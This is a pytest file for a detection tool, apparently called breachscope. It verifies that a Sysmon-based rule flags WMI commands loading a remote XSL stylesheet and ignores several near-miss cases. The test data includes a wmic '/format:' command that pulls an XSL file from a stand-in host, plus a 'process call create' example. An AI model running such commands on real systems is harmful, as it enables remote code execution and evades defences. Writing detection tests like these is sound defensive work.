from pathlib import Path

from breachscope.analyzer import apply_rules
from breachscope.rules import load_rules
from breachscope.schemas import Event


ROOT = Path(__file__).resolve().parents[1]
TARGET_RULE_ID = "R-WMI-XSL-Format"


def _rules():
    return load_rules(ROOT / "rules")


def _event(event_id: str, source: str, command_line: str) -> Event:
    return Event(
        timestamp="2026-09-08T00:00:00Z",
        host="host1",
        source=source,
        event_id=event_id,
        command_line=command_line,
        raw={},
    )


def _target_findings(event: Event):
    return [
        finding
        for finding in apply_rules([event], _rules())
        if finding.rule_id == TARGET_RULE_ID
    ]


def test_sysmon_event_1_remote_wmic_xsl_matches_target_rule() -> None:
    matches = _target_findings(
        _event(
            "1",
            "Microsoft-Windows-Sysmon",
            'wmic process list /format:"https://example.invalid/test.xsl"',
        )
    )

    assert len(matches) == 1
    assert matches[0].mitre_technique == "T1047"


def test_wrong_event_id_does_not_match_target_rule() -> None:
    matches = _target_findings(
        _event(
            "3",
            "Microsoft-Windows-Sysmon",
            'wmic process list /format:"https://example.invalid/test.xsl"',
        )
    )
    assert matches == []


def test_wrong_provider_does_not_match_target_rule() -> None:
    matches = _target_findings(
        _event(
            "1",
            "Other-Provider",
            'wmic process list /format:"https://example.invalid/test.xsl"',
        )
    )
    assert matches == []


def test_local_wmic_format_does_not_match_target_rule() -> None:
    matches = _target_findings(
        _event("1", "Microsoft-Windows-Sysmon", "wmic process list /format:list")
    )
    assert matches == []


def test_existing_wmi_process_create_pattern_does_not_match_new_rule() -> None:
    event = _event(
        "1",
        "Microsoft-Windows-Sysmon",
        "wmic process call create calc.exe",
    )
    findings = list(apply_rules([event], _rules()))

    assert any(finding.rule_id == "R-WMI-Create" for finding in findings)
    assert all(finding.rule_id != TARGET_RULE_ID for finding in findings)
